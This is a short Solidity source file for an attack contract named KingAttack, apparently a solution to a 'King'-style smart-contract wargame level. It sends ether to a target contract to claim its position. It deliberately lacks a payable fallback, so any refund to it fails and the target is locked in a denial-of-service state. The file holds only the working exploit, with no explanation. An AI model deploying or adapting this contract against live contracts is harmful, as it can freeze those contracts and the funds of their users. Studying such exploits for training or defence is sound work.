pragma solidity ^0.5.0;


contract KingAttack {

  function doYourThing(address _target) public payable {
    (bool result, bytes memory data) = _target.call.value(msg.value)("");
    if(!result) revert();
  }

  // OMG NO PAYABLE FALLBACK!!
}
